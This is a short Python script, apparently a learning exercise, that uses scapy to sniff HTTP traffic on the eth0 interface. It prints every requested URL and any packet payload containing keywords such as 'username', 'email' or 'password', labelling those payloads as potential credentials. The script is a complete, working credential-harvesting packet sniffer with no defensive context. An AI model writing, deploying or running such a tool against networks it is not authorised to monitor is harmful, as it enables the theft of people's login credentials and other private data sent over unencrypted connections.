#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def getUrl(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print(url)

def getCredentials(packet):
    load = str(packet[scapy.Raw].load)
    keywords = ["uname", "username", "email", "login", "password", "pwd", "pass"]
    for keyword in keywords:
        if keyword in load:
            return(load)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        getUrl(packet)
        if packet.haslayer(scapy.Raw):
            credentials = getCredentials(packet)
            if credentials:
                print("Potential Credentials:" + credentials)

sniff('eth0')